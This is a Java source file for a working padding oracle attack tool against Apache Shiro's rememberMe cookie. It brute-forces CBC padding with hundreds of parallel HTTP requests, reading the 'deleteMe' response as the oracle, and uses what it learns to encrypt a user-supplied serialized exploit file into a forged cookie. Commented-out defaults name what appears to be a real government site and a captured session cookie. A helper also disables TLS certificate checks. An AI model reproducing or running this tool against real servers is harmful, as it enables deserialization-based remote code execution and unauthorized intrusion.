package com.longofo;

import org.apache.http.Header;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ssl.NoopHostnameVerifier;
import org.apache.http.conn.ssl.SSLConnectionSocketFactory;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.log4j.Logger;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.security.cert.X509Certificate;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class POracle {
    private static final Logger logger = Logger.getLogger(POracle.class);
    private byte[] plainText;
    private int blockSize;
    private int encryptBlockCount;
    private String url;
    private String loginRememberMe;
    private int requestCount;
    private int tryTime;

    public POracle(byte[] plainText, int blockSize, String url, String loginRememberMe, int tryTime) throws IOException {
        this.blockSize = blockSize;
        this.plainText = this.paddingData(plainText);
        this.url = url;
        this.loginRememberMe = loginRememberMe;
        this.requestCount = 0;
        this.tryTime = tryTime;
    }


    private byte[] paddingData(byte[] data) throws IOException {
        int paddingLength = this.blockSize - (data.length % this.blockSize);

        //计算要填充哪一个字节
        byte paddingByte = (byte) paddingLength;
        byte[] paddingBytes = new byte[paddingLength];
        Arrays.fill(paddingBytes, paddingByte);

        return ArrayUtil.mergerArray(data, paddingBytes);
    }

    private byte[] getBlockEncrypt(byte[] PlainTextBlock, byte[] nextCipherTextBlock) throws Exception {
        byte[] tmpIV = new byte[this.blockSize];
        byte[] encrypt = new byte[this.blockSize];
        Arrays.fill(tmpIV, (byte) 0);

        for (int index = this.blockSize - 1; index >= 0; index--) {
            Exception exception;
            int i = 0;
            do {
                exception = null;
                try {
                    tmpIV[index] = this.findCharacterEncrypt(index, tmpIV, nextCipherTextBlock);
                    logger.debug(String.format("Current string => %s, the %d block", ArrayUtil.bytesToHex(ArrayUtil.mergerArray(tmpIV, nextCipherTextBlock)), this.encryptBlockCount));
                } catch (Exception e) {
                    e.printStackTrace();
                    System.out.println("开始第" + (i + 1) + "次重试...");
                    exception = e;
                }
            } while (exception != null && i++ < 15);
        }

        for (int index = 0; index < this.blockSize; index++) {
            encrypt[index] = (byte) (tmpIV[index] ^ PlainTextBlock[index]);
        }
        return encrypt;
    }

    private boolean checkPaddingAttackRequest(String rememberMe) throws IOException {


        RequestConfig defaultRequestConfig = RequestConfig.custom()
                .setSocketTimeout(30000)
                .setConnectTimeout(30000)
                .setConnectionRequestTimeout(30000)
                .setStaleConnectionCheckEnabled(true)
                .build();

        CloseableHttpClient httpClient = HttpClients.custom()
                .setDefaultRequestConfig(defaultRequestConfig)
                .build();
//        CloseableHttpClient httpClient = HttpClients.createDefault();
//        CloseableHttpClient httpClient = getSkipHttpsVerifyHttpClient();
        HttpGet httpGet = new HttpGet(this.url);
        CloseableHttpResponse response = null;
        boolean success = true;

        httpGet.addHeader("User-Agent", "Mozilla/5.0");
        httpGet.addHeader("Referer", this.url);
        httpGet.addHeader("Cookie", String.format("rememberMe=%s", rememberMe));

        try {
            response = httpClient.execute(httpGet);
            this.requestCount += 1;
            Header[] headers = response.getAllHeaders();
            if (response.getStatusLine().getStatusCode() == 200) {
                for (Header header : headers) {
                    if (header.getName().equals("Set-Cookie") && header.getValue().contains("rememberMe=deleteMe"))
                        success = false;
                }
            }
        } catch (IOException e) {
            logger.error("Request error when checkPaddingAttackRequest", e);
        } finally {
            if (response != null) response.close();
            httpClient.close();
        }
        return success;
    }

    /**
     * 获取跳过 HTTPS 验证的 HTTPClient
     */
    private CloseableHttpClient getSkipHttpsVerifyHttpClient() {
        try {
            SSLContext ctx = SSLContext.getInstance("TLS");
            X509TrustManager tm = new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }

                public void checkClientTrusted(X509Certificate[] arg0,
                                               String arg1) {
                }

                public void checkServerTrusted(X509Certificate[] arg0,
                                               String arg1) {
                }
            };
            ctx.init(null, new TrustManager[]{tm}, null);
            SSLConnectionSocketFactory ssf = new SSLConnectionSocketFactory(
                    ctx, NoopHostnameVerifier.INSTANCE);
            return HttpClients.custom()
                    .setSSLSocketFactory(ssf).build();
        } catch (Exception e) {
            e.printStackTrace();
            return HttpClients.createDefault();
        }
    }

    private byte findCharacterEncrypt(int index, byte[] tmpIV, byte[] nextCipherTextBlock) throws Exception {
        if (nextCipherTextBlock.length != this.blockSize) {
            throw new Exception("CipherTextBlock size error!!!");
        }

        byte paddingByte = (byte) (this.blockSize - index);
        byte[] preBlock = new byte[this.blockSize];
        Arrays.fill(preBlock, (byte) 0);

        for (int ix = index; ix < this.blockSize; ix++) {
            preBlock[ix] = (byte) (paddingByte ^ tmpIV[ix]);
        }

        byte[] tmpBLock1 = Base64.getDecoder().decode(this.loginRememberMe);

        CheckRequestThread[] threads = new CheckRequestThread[256];
        ExecutorService fixedThreadPool = Executors.newFixedThreadPool(128);
        Byte[] resBytes = new Byte[256];
        final CountDownLatch latch = new CountDownLatch(256);

        for (int c = 0; c < 256; c++) {
            //nextCipherTextBlock[index] < 256，那么在这个循环结果中构成的结果还是range(1,256)
            //所以下面两种写法都是正确的，当时看到原作者使用的是第一种方式有点迷，测试了下都可以
//            preBlock[index] = (byte) (paddingByte ^ nextCipherTextBlock[index] ^ c);
            final int i = c;
            preBlock[index] = (byte) c;

            byte[] newPreBlock = new byte[preBlock.length];
            System.arraycopy(preBlock, 0, newPreBlock, 0, preBlock.length);

            fixedThreadPool.execute(() -> {
                try {
                    byte[] tmpBlock2 = ArrayUtil.mergerArray(newPreBlock, nextCipherTextBlock);
                    byte[] tmpBlock3 = ArrayUtil.mergerArray(tmpBLock1, tmpBlock2);
                    String rememberMe = Base64.getEncoder().encodeToString(tmpBlock3);
                    if (this.checkPaddingAttackRequest(rememberMe)) {
                        resBytes[i] = (byte) (newPreBlock[index] ^ paddingByte);
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                } finally {
                    latch.countDown();
                }
            });
//            threads[c] = new CheckRequestThread(this.url, index, paddingByte, newPreBlock, nextCipherTextBlock, tmpBLock1, this.tryTime);
//            threads[c].start();
        }

//        for (int i = 0; i < 256; i++) {
//            threads[i].join();
//            Byte b = threads[i].getResByte();
//            if (null != b) {
//                return b;
//            }
//        }
        try {
            latch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        for (int i = 0; i < 256; i++) {
            if (null != resBytes[i]) {
                return resBytes[i];
            }
        }

        throw new Exception("Occurs errors when find encrypt character, couldn't find a suitable Character!!!");
    }

    public String encrypt(byte[] nextBLock) throws Exception {
        logger.debug("Start encrypt data...");
        byte[][] plainTextBlocks = ArrayUtil.splitBytes(this.plainText, this.blockSize);

        if (nextBLock == null || nextBLock.length == 0 || nextBLock.length != this.blockSize) {
            logger.warn("You provide block's size is not equal blockSize,try to reset it...");
            nextBLock = new byte[this.blockSize];
        }
        byte randomByte = (byte) (new Random()).nextInt(127);
        Arrays.fill(nextBLock, randomByte);

        byte[] result = nextBLock;
        byte[][] reversePlainTextBlocks = ArrayUtil.reverseTwoDimensionalBytesArray(plainTextBlocks);
        this.encryptBlockCount = reversePlainTextBlocks.length;
        logger.info(String.format("Total %d blocks to encrypt", this.encryptBlockCount));

        for (byte[] plainTextBlock : reversePlainTextBlocks) {
            nextBLock = this.getBlockEncrypt(plainTextBlock, nextBLock);
            result = ArrayUtil.mergerArray(nextBLock, result);

            this.encryptBlockCount -= 1;
            logger.info(String.format("Left %d blocks to encrypt", this.encryptBlockCount));
        }

        logger.info(String.format("Generate payload success, send request count => %s", this.requestCount));

        return Base64.getEncoder().encodeToString(result);
    }

    public static byte[] getFileContent(String filePath) throws IOException {
        File file = new File(filePath);
        long fileSize = file.length();
        if (fileSize > Integer.MAX_VALUE) {
            System.out.println("file too big...");
            return null;
        }
        FileInputStream fi = new FileInputStream(file);
        byte[] buffer = new byte[(int) fileSize];
        int offset = 0;
        int numRead;
        while (offset < buffer.length
                && (numRead = fi.read(buffer, offset, buffer.length - offset)) >= 0) {
            offset += numRead;
        }
        // 确保所有数据均被读取
        if (offset != buffer.length) {
            throw new IOException("Could not completely read file "
                    + file.getName());
        }
        fi.close();
        return buffer;
    }

    public static void main(String[] args) throws Exception {
        if (args.length != 5) {
            logger.info("Usage: java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath");
            System.exit(0);
        }
        String targetUrl = args[0];
        String rememberMeCookie = args[1];
        int blockSize = Integer.parseInt(args[2]);
        String payloadFilePath = args[3];
        int tryTime = Integer.parseInt(args[4]);
//        String targetUrl = "https://sfrz.zwfw.hlj.gov.cn/sfrz/a/sys/user/info";
//        String rememberMeCookie = "bJB2DJ3GYBDxyZ9u40p+9XeSSXr2BfTB/GzfWXUHv6ESxmy8iP3SThd/EZDtEKdiCWhYVwBIuMyeMor0rSEJStbIHy2cKJJ2+jvsqn1c4ZJrd1JbM461e7C/lcSAzTrEBVSLdC2gHcE7cE793O+oU+qYOaMc/MQGd7vUmk/C/OnNap/u45ndC6veHo3iDXLl39oakhlFz7dfU9g2opM3Bb2FQJEkDtna/zpgd3wC4PYHaqTdOsUjAqwSm5uHWoscHNa+SXIjsqwrgYeWIZ2NDGy7D+FnaXrTkPij4ZtXtVNindznHhwDj/1zPOmi9z32GfSgxC+iCv2wXfKd/LImg1/C/xTttUltATcwH7cL+c7Aiq4M4Y5HPr4Jwl4Ayprx4e45r6X1GSX4dv31kMrtT3CHRfvY9jKP2r5FW8c7aUufLiTdO1S9zDScWZmyWv7ZB6o8njOEyjCOm8LcN4fKHoVKzYseydlJMb0ScMlZAF6Z5UMX/xzd6Y+8FJv2A02ReneUOXEF/Dcw+0Acm6U6iqAreYh1Q37eNB4g50MdXSTkGVp4qADXuIJ/Wknkx0B1ibjMhjLHAOdSYY3RNt+qyBYLnpdwPknap4EAPCr42XuD820cilZxGzz2gdc2KgTGNzlNLbYmMslD8USSQX7/S0rbhkPCJOykezC/qaHY+Dp8RO6LwY+LUWDpQbVImlcCwiL7mrttHjJr++Yq3q0cgZ5uobBzn3IZ0F0dxF81GhM6bIsNVpnZ3JDQTblOVpeYl+hYiyI3pRLALYjdAjvzvX3b7w2G35e35PbrHQodL1XD5itHJaUH9MbbG5LvVcosL0VjzCJyOn8YncgVQAQhlakZW1EBvEx5QPz2vv+lOmmaETpBUWbjAcFvvF/L43Sg+zUuYV74dC4c6TDWOSiYSQrqffv+/T4aYN2aOZSfmCLbUZlS2Rasa/nTV1uNg2PVXlgvZC3EVI+Bw+Pl2r7GPoldDj9Dt7+Ap9TRE9OZHgW0ty7wQ9ESuEw1bCh33SO+LNHx3stYCmNtbbrkBTFnc6jRP5W1gvQYZFaf3wdBvFKRQnhjmtLmGyTlvcXCgFDZ9sJCAQ8R3Wu1PN0vRCjS7mRpPagaW0m3S3FSkzj7FsB8DxxHw2OPv7r02cVyayos8Z4uhavtG1jeE3BzV06W4ynP45LYHC9iXJDseBEfdm8OUJ3hMrkJCqoNsf1AdhqQTkArRJaxPpYvTy0Y3op9X/3b+Wb2nDFkHO3q/dIFMXcVhJBIog0N625ME0+huSVlDm8sQqO4w9szhqkuUaPsThxoKWLEAdU8Yfd2eDP8TkrgxtJ2EOVD2OXvk1UX7eNoTjVzsp+Wa17DNHwDzKQhEr70u7k7GkWga1+2NKwkUjmcdtsAWV8pM11SpscDCFCQwOiiznKY1XM9ke3oR3EDfx7AYbYLSu1IqSj0KnrJTJVFszsofjk4DdDbLC5lXdy1RFbFHBsSvTS+TxbMQZ9BD7ySrByALM+anFaPP6HUQt4KMX2YPC2Sg+gO1GPAkOad0PuDfid79I9OSBzra4h1ir3lo6mwqkr5q6ya+IciAGrkjIkvY26embevlkt/fX8EDveI7v6kZKWsG4JARxQ883/H7LbEjMtkzDoc5he/A+NYUyHR56H0+uoQ/WY5hwWtVhyPytb8pa0vTCEeniaj6Q==";
//        int blockSize = 16;
//        String payloadFilePath = "D:\\t\\exp.ser";
        POracle poracle = new POracle(getFileContent(payloadFilePath), blockSize, targetUrl, rememberMeCookie, tryTime);

        logger.info(String.format("Result => %s", poracle.encrypt(null)));
    }

    public byte[] getPlainText() {
        return plainText;
    }

    public void setPlainText(byte[] plainText) {
        this.plainText = plainText;
    }

    public int getBlockSize() {
        return blockSize;
    }

    public void setBlockSize(int blockSize) {
        this.blockSize = blockSize;
    }

    public int getEncryptBlockCount() {
        return encryptBlockCount;
    }

    public void setEncryptBlockCount(int encryptBlockCount) {
        this.encryptBlockCount = encryptBlockCount;
    }

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getLoginRememberMe() {
        return loginRememberMe;
    }

    public void setLoginRememberMe(String loginRememberMe) {
        this.loginRememberMe = loginRememberMe;
    }

    public int getRequestCount() {
        return requestCount;
    }

    public void setRequestCount(int requestCount) {
        this.requestCount = requestCount;
    }

    public int getTryTime() {
        return tryTime;
    }

    public void setTryTime(int tryTime) {
        this.tryTime = tryTime;
    }
}
